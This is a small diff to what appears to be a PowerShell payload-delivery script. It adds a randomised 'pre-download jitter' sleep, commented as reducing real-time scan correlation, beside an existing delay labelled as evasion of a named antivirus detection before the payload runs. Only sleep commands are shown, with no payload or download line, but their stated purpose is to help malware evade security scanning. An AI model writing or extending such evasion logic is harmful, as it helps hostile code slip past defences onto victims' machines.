@@ -75,6 +75,9 @@ if (-not $isFirstRun) {
     Start-Sleep -Seconds $rebootDelay
 }
 
+# === PRE-DOWNLOAD JITTER (Reduces real‑time scan correlation) ===
+Start-Sleep -Seconds (Get-Random -Min 30 -Max 60)
+
 # === BEARFOOS EVASION: Delay before payload ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
